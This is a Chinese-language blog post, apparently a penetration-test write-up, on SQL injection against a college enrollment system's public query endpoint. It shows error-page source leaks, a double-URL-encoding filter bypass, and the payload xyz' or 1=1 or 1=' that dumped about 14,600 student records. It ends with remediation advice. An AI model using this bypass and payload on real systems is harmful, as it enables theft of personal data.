@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"wxm777.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"tokyo-night-dark","dark":"tokyo-night-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"show_result":true,"style":"mac"},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":false,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="0x00 前言这个注入点所在的系统，防护措施看起来是齐的：全局 SQL 注入过滤器拦单引号，DAO 层拦注释符和分号，怎么看都不像能注的样子。最终它被打穿，靠的不是什么高级手法，而是错误页泄露的几行 JSP 源码——源码里一次多余的 URLDecoder.decode()，让过滤器做的所有检查全部失效。 本文复盘这个漏洞的完整挖掘过程：从探测被拦的死路，到从报错堆里反推出防御架构，再到双编码绕过、">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入复盘：双URL编码绕过全局过滤器拖取1.4万条新生信息">
+<meta property="og:url" content="https://wxm777.github.io/post/837d9b56/index.html">
+<meta property="og:site_name" content="smile cat的博客">
+<meta property="og:description" content="0x00 前言这个注入点所在的系统，防护措施看起来是齐的：全局 SQL 注入过滤器拦单引号，DAO 层拦注释符和分号，怎么看都不像能注的样子。最终它被打穿，靠的不是什么高级手法，而是错误页泄露的几行 JSP 源码——源码里一次多余的 URLDecoder.decode()，让过滤器做的所有检查全部失效。 本文复盘这个漏洞的完整挖掘过程：从探测被拦的死路，到从报错堆里反推出防御架构，再到双编码绕过、">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-08-14T02:00:00.000Z">
+<meta property="article:author" content="smile cat">
+<meta property="article:tag" content="SQL注入">
+<meta property="article:tag" content="敏感信息泄露">
+<meta property="article:tag" content="漏洞复盘">
+<meta property="article:tag" content="绕过技巧">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://wxm777.github.io/post/837d9b56/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://wxm777.github.io/post/837d9b56/","path":"post/837d9b56/","title":"SQL注入复盘：双URL编码绕过全局过滤器拖取1.4万条新生信息"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>SQL注入复盘：双URL编码绕过全局过滤器拖取1.4万条新生信息 | smile cat的博客</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="smile cat的博客" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">smile cat的博客</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E6%94%BB%E5%87%BB%E9%9D%A2%E5%AE%9A%E4%BD%8D%EF%BC%9A%E4%B8%80%E4%B8%AA%E6%97%A0%E9%89%B4%E6%9D%83%E7%9A%84%E5%85%AC%E5%BC%80%E6%9F%A5%E8%AF%A2%E6%8E%A5%E5%8F%A3"><span class="nav-number">2.</span> <span class="nav-text">0x01 攻击面定位：一个无鉴权的公开查询接口</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E6%AD%A3%E9%9D%A2%E8%AF%95%E6%8E%A2%EF%BC%9A%E8%BF%87%E6%BB%A4%E5%99%A8%E6%8B%A6%E6%88%AA%E4%B8%8B%E7%9A%84%E6%AD%BB%E8%B7%AF"><span class="nav-number">3.</span> <span class="nav-text">0x02 正面试探：过滤器拦截下的死路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E8%BD%AC%E6%8A%98%E7%82%B9%EF%BC%9A%E6%8A%A5%E9%94%99%E9%A1%B5%E6%B3%84%E9%9C%B2%E7%9A%84%E6%BA%90%E7%A0%81%E9%87%8C%E8%97%8F%E7%9D%80%E7%BB%95%E8%BF%87%E9%92%A5%E5%8C%99"><span class="nav-number">4.</span> <span class="nav-text">0x03 转折点：报错页泄露的源码里藏着绕过钥匙</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E7%BB%95%E8%BF%87%E9%AA%8C%E8%AF%81%E4%B8%8E%E9%98%B2%E5%BE%A1%E6%B5%8B%E7%BB%98"><span class="nav-number">5.</span> <span class="nav-text">0x04 绕过验证与防御测绘</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E6%9C%80%E7%BB%88%E6%9E%84%E9%80%A0%EF%BC%9A%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7%EF%BC%8C%E9%9B%B6%E6%B3%A8%E9%87%8A%E7%AC%A6%E6%81%92%E7%9C%9F"><span class="nav-number">6.</span> <span class="nav-text">0x05 最终构造：运算符优先级，零注释符恒真</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-%E6%80%BB%E7%BB%93%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="nav-number">7.</span> <span class="nav-text">0x06 总结与防御建议</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="smile cat"
+      src="/images/wxm.jpg">
+  <p class="site-author-name" itemprop="name">smile cat</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">23</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/wxm777" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;wxm777" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://wxm777.github.io/post/837d9b56/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/wxm.jpg">
+      <meta itemprop="name" content="smile cat">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="smile cat的博客">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="SQL注入复盘：双URL编码绕过全局过滤器拖取1.4万条新生信息 | smile cat的博客">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SQL注入复盘：双URL编码绕过全局过滤器拖取1.4万条新生信息
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-08-14 10:00:00" itemprop="dateCreated datePublished" datetime="2026-08-14T10:00:00+08:00">2026-08-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%AE%9E%E6%88%98%E5%A4%8D%E7%9B%98/" itemprop="url" rel="index"><span itemprop="name">实战复盘</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>4.2k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>4 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>这个注入点所在的系统，防护措施看起来是齐的：全局 SQL 注入过滤器拦单引号，DAO 层拦注释符和分号，怎么看都不像能注的样子。最终它被打穿，靠的不是什么高级手法，而是错误页泄露的几行 JSP 源码——源码里一次多余的 <code>URLDecoder.decode()</code>，让过滤器做的所有检查全部失效。</p>
+<p>本文复盘这个漏洞的完整挖掘过程：从探测被拦的死路，到从报错堆里反推出防御架构，再到双编码绕过、运算符优先级构造，最终未授权拖取 1.4 万条新生个人信息（含完整身份证号）。重点记录每一步的判断依据，而非单纯的复现。</p>
+<span id="more"></span>
+
+<h2 id="0x01-攻击面定位：一个无鉴权的公开查询接口"><a href="#0x01-攻击面定位：一个无鉴权的公开查询接口" class="headerlink" title="0x01 攻击面定位：一个无鉴权的公开查询接口"></a>0x01 攻击面定位：一个无鉴权的公开查询接口</h2><p>目标为某职业技术学院的报名&#x2F;迎新管理系统。信息收集阶段发现一个对外公开的新生班级查询模块，无需登录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /ECCustom/kjxy_lqcx/getData.jsp?name=&lt;姓名&gt;&amp;sfz=&lt;身份证后六位&gt;&amp;type=results</span><br></pre></td></tr></table></figure>
+
+<p>正常查询一个不存在的姓名，返回：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;flag&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span><span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span><span class="string">&quot;未找到指定记录，请重试&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>功能本身没问题，但两点引起了注意：一是接口命中时返回的字段包含完整身份证号、电话、QQ 等高浓度 PII；二是 JSP 技术栈 + GET 参数直查数据库，参数拼接进 SQL 的概率很高。信息收集中还确认了站点存在全局的 <code>SqlInjectionFilter</code> 和 <code>XSSFilter</code>（从其他页面的报错堆栈中看到的类名），所以注入测试必然要和过滤器打交道。</p>
+<h2 id="0x02-正面试探：过滤器拦截下的死路"><a href="#0x02-正面试探：过滤器拦截下的死路" class="headerlink" title="0x02 正面试探：过滤器拦截下的死路"></a>0x02 正面试探：过滤器拦截下的死路</h2><p>先测最直接的单引号：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=测试&#x27;  （URL 编码为 %27）</span><br></pre></td></tr></table></figure>
+
+<p>返回 <code>{&quot;flag&quot;:false,&quot;error&quot;:&quot;参数存在特殊字符请检查&quot;}</code>——全局过滤器拦截了单引号，请求根本没到业务层。换 <code>sfz</code> 参数、换位置，结果一样。</p>
+<p>按常规思路，到这里基本可以记录”有过滤，注入不成立”然后换目标了。但在转向之前，我做了一组参数行为测绘，想看看这个接口的边界情况，其中两条结果改变了整个测试方向：</p>
+<table>
+<thead>
+<tr>
+<th>探测</th>
+<th>响应</th>
+<th>初步结论</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>省略 <code>type</code> 参数</td>
+<td>500 空指针异常堆栈</td>
+<td>type 参与代码逻辑，被直接解引用</td>
+</tr>
+<tr>
+<td><code>name=%</code>（单个百分号）</td>
+<td>500 报错 + <strong>泄露 getData.jsp 源码第 60-66 行</strong></td>
+<td>见下</td>
+</tr>
+</tbody></table>
+<h2 id="0x03-转折点：报错页泄露的源码里藏着绕过钥匙"><a href="#0x03-转折点：报错页泄露的源码里藏着绕过钥匙" class="headerlink" title="0x03 转折点：报错页泄露的源码里藏着绕过钥匙"></a>0x03 转折点：报错页泄露的源码里藏着绕过钥匙</h2><p><code>name=%</code> 触发的是服务端的 URL 解码异常，错误页直接把相关源码打了出来：</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">60</span>: <span class="keyword">if</span>(flag1 &amp;&amp; flag2 &amp;&amp; flag3)&#123;</span><br><span class="line"><span class="number">62</span>:   <span class="keyword">if</span>(!StringHelper.isEmpty(name) &amp;&amp; !StringHelper.isEmpty(sfz))&#123;</span><br><span class="line"><span class="number">63</span>:     name = URLDecoder.decode(name,<span class="string">&quot;UTF-8&quot;</span>);   <span class="comment">// 服务端二次解码！</span></span><br><span class="line"><span class="number">64</span>:     <span class="keyword">if</span>(StringHelper.isEmpty(type))&#123; type=<span class="string">&quot;identification&quot;</span>; &#125;</span><br></pre></td></tr></table></figure>
+
+<p>第 63 行是整条链的核心：<strong>业务代码在过滤器检查之后，又对 <code>name</code> 参数做了一次 <code>URLDecoder.decode()</code></strong>。</p>
+<p>这意味着请求的处理顺序是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">原始请求 ──&gt; SqlInjectionFilter 检查（看到的是编码后的字符串）</span><br><span class="line">        ──&gt; getData.jsp 业务代码 ──&gt; URLDecoder.decode() 再解一次</span><br><span class="line">        ──&gt; 拼接进 SQL</span><br></pre></td></tr></table></figure>
+
+<p>过滤器检查的是”原始输入”，而真正进入 SQL 的是”被多解了一次码的输入”。只要把整个 payload 做<strong>两次 URL 编码</strong>：单引号写成 <code>%2527</code>，过滤器看到的是无害的 <code>%2527</code>，进入 SQL 前才被还原成 <code>&#39;</code>。防护从原理上失效。</p>
+<p><strong>经验总结</strong>：报错页和堆栈信息在黑盒测试里相当于一部分源码审计能力。很多系统的防御不是不够强，而是层与层之间的顺序出了问题——过滤器只校验原始输入、业务层再解码&#x2F;再拼接，这类”接缝缺陷”只能靠理解处理链条来发现， fuzz 是 fuzz 不出来的。</p>
+<h2 id="0x04-绕过验证与防御测绘"><a href="#0x04-绕过验证与防御测绘" class="headerlink" title="0x04 绕过验证与防御测绘"></a>0x04 绕过验证与防御测绘</h2><p>思路明确了，但需要逐个验证细节，同时摸清剩下的防御：</p>
+<table>
+<thead>
+<tr>
+<th>探测</th>
+<th>响应</th>
+<th>结论</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>sfz</code> 双编码 <code>%2527</code></td>
+<td>正常返回”未找到”</td>
+<td>sfz 没有二次解码逻辑，不是注入通道，排除</td>
+</tr>
+<tr>
+<td><code>name</code> 双编码 <code>%2527</code></td>
+<td><strong>500 BadSqlGrammarException，泄露完整 SQL</strong></td>
+<td>双编码绕过成立，name 是注入点</td>
+</tr>
+</tbody></table>
+<p>报错里泄露的完整 SQL：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> Fname,Fcard,Fclass,Fdepartment,Fteacher,Fphone,Fqq,Fno</span><br><span class="line"><span class="keyword">from</span> uf_doc_results <span class="keyword">where</span> Fname <span class="operator">=</span><span class="string">&#x27;&lt;name&gt;&#x27;</span> <span class="keyword">and</span> <span class="keyword">right</span>(Fcard,<span class="number">6</span>) <span class="operator">=</span><span class="string">&#x27;&lt;sfz&gt;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>数据库确认为 Microsoft SQL Server，目标表为 <code>uf_doc_results</code>。注入点、库型、表结构三个关键信息齐了。</p>
+<p>但还有最后一道防线。继续测绘：</p>
+<table>
+<thead>
+<tr>
+<th>探测</th>
+<th>响应</th>
+<th>结论</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>注入语句含 <code>--</code> 或 <code>;</code></td>
+<td>500 空指针，语句未执行</td>
+<td>DAO 层有守卫，拦截注释符和分号</td>
+</tr>
+<tr>
+<td>注入语句含 <code>/*</code> 不闭合</td>
+<td>500 “缺少注释的结尾标记”</td>
+<td><code>/*</code> 能过守卫，但需要闭合；而闭合用的 <code>*/</code> 放在 sfz 里又被特殊字符校验拦截</td>
+</tr>
+<tr>
+<td><code>xyz&#39; or &#39;1&#39;=&#39;1</code>（不用注释符）</td>
+<td>“未找到”</td>
+<td>引号成对闭合了，但 AND 优先级高于 OR，尾部 <code>and right(Fcard,6)=&#39;sfz&#39;</code> 仍然生效，恒真失败</td>
+</tr>
+</tbody></table>
+<p>第三行是最后一个坎：不用注释符的话，尾部的身份证后六位条件始终参与运算，<code>or &#39;1&#39;=&#39;1&#39;</code> 并不能让全表返回。</p>
+<h2 id="0x05-最终构造：运算符优先级，零注释符恒真"><a href="#0x05-最终构造：运算符优先级，零注释符恒真" class="headerlink" title="0x05 最终构造：运算符优先级，零注释符恒真"></a>0x05 最终构造：运算符优先级，零注释符恒真</h2><p>解决办法是把尾部条件”架空”而不是”注释掉”。观察原始 WHERE 结构：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">where</span> Fname <span class="operator">=</span><span class="string">&#x27;&lt;name&gt;&#x27;</span> <span class="keyword">and</span> <span class="keyword">right</span>(Fcard,<span class="number">6</span>) <span class="operator">=</span><span class="string">&#x27;&lt;sfz&gt;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>AND 优先级高于 OR，那么只要注入的内容把 WHERE 切成三段，让中间一段恒真即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name = xyz&#x27; or 1=1 or 1=&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>拼接还原后的完整 SQL：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">where</span> Fname <span class="operator">=</span><span class="string">&#x27;xyz&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> <span class="keyword">right</span>(Fcard,<span class="number">6</span>) <span class="operator">=</span><span class="string">&#x27;123456&#x27;</span></span><br><span class="line"><span class="comment">--       段1: 恒假  OR  段2: 恒真  OR  段3: 无所谓</span></span><br></pre></td></tr></table></figure>
+
+<p>OR 运算把 WHERE 分成三段，中间 <code>1=1</code> 恒真，尾部 AND 条件被隔离在第三段里，不再影响整体结果。全程不使用 <code>--</code>、<code>;</code>、<code>/*</code>，DAO 层守卫无可拦截。</p>
+<p>将 <code>xyz&#39; or 1=1 or 1=&#39;</code> 整体做两次 URL 编码后发送，返回 HTTP 200，响应体 2.8MB：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;flag&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;Fname&quot;</span><span class="punctuation">:</span><span class="string">&quot;李**&quot;</span><span class="punctuation">,</span><span class="attr">&quot;Fcard&quot;</span><span class="punctuation">:</span><span class="string">&quot;140621200509******&quot;</span><span class="punctuation">,</span><span class="attr">&quot;Fclass&quot;</span><span class="punctuation">:</span><span class="string">&quot;物流3242&quot;</span><span class="punctuation">,</span><span class="attr">&quot;Fdepartment&quot;</span><span class="punctuation">:</span><span class="string">&quot;工商管理学院&quot;</span><span class="punctuation">,</span><span class="attr">&quot;Fteacher&quot;</span><span class="punctuation">:</span><span class="string">&quot;赖*&quot;</span><span class="punctuation">,</span><span class="attr">&quot;Fphone&quot;</span><span class="punctuation">:</span><span class="string">&quot;150062893**&quot;</span><span class="punctuation">,</span><span class="attr">&quot;Fqq&quot;</span><span class="punctuation">:</span><span class="string">&quot;286782**5&quot;</span><span class="punctuation">,</span><span class="attr">&quot;Fno&quot;</span><span class="punctuation">:</span><span class="string">&quot;240935302**&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span> ... 共<span class="number">14598</span>条 ...<span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>新生信息表全部 <strong>14598 条记录</strong>一次拖出，字段包括姓名、完整 18 位身份证号、班级、院系、班主任、电话、QQ、学号。</p>
+<p><strong>对照组</strong>：同样双编码的 <code>xyz&#39; or 1=2 or 1=&#39;</code>（恒假），返回 <code>{&quot;flag&quot;:false,&quot;msg&quot;:&quot;未找到指定记录&quot;}</code>。两次请求仅 <code>1=1</code>&#x2F;<code>1=2</code> 一字之差，响应从”未找到”变为全表数据，布尔差异明确，注入成立无疑。</p>
+<h2 id="0x06-总结与防御建议"><a href="#0x06-总结与防御建议" class="headerlink" title="0x06 总结与防御建议"></a>0x06 总结与防御建议</h2><p>回顾整条链，这个系统其实有三层防护：全局过滤器拦单引号、DAO 层拦注释符、sfz 参数的特殊字符校验。每一层单独看都在工作，但层与层的接缝处全是缺口——过滤器之后业务代码多解了一次码，DAO 守卫只认注释符不认运算符优先级。<strong>防护栈的弱点很少在某一层内部，而通常在层与层的衔接处。</strong></p>
+<p><strong>几点测试方法论上的收获：</strong></p>
+<ol>
+<li><strong>报错信息要主动利用</strong>。本次的两个转折点（泄露 JSP 源码、泄露完整 SQL）都来自 500 错误页。探测时有意构造异常输入（<code>%</code>、缺参数、类型错误）触发报错，往往比正面 fuzz 更快摸清防御架构。</li>
+<li><strong>绕过思路来自处理链条，不来自 payload 字典</strong>。双编码能成立，是因为先确认了”过滤器先查、业务层后解码”这个顺序。不理解链条就盲目套编码绕过字典，大概率无功而返。</li>
+<li><strong>恒真&#x2F;恒假对照要做完</strong>。拖出数据固然是实锤，但恒假对照组是排除”接口本来就返全量”这类误判的必要动作，尤其面对不熟悉的业务接口。</li>
+</ol>
+<p><strong>给防守方的修复建议：</strong></p>
+<ol>
+<li>所有 SQL 改用参数化查询（PreparedStatement），严禁字符串拼接，这是根治手段；</li>
+<li>删除业务代码中多余的二次 <code>URLDecoder.decode()</code>；如确需解码，解码后必须重新校验；</li>
+<li>不要依赖关键字黑名单作为防线（无论过滤器还是 DAO 守卫），本次两道黑名单均被绕过；</li>
+<li>生产环境关闭详细错误回显——当前错误页泄露完整堆栈、SQL 语句和 JSP 源码行号，是本次攻击的关键情报来源；</li>
+<li>查询接口增加频次与返回条数限制，敏感字段（身份证号）返回时脱敏。</li>
+</ol>
+<hr>
+<p><em>测试全程仅使用 GET 查询，未修改、写入、删除任何数据；响应样本已脱敏，未保存传播完整数据。文中目标信息已做匿名化处理。</em></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%9B%98/" rel="tag"># 漏洞复盘</a>
+              <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag"># SQL注入</a>
+              <a href="/tags/%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/" rel="tag"># 绕过技巧</a>
+              <a href="/tags/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" rel="tag"># 敏感信息泄露</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/post/7492c019/" rel="prev" title="被动资产收集工具的设计与迭代复盘">
+                  <i class="fa fa-angle-left"></i> 被动资产收集工具的设计与迭代复盘
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/post/220d87d5/" rel="next" title="未授权文件上传复盘：任意文件写入的危害定界与GetShell证伪">
+                  未授权文件上传复盘：任意文件写入的危害定界与GetShell证伪 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
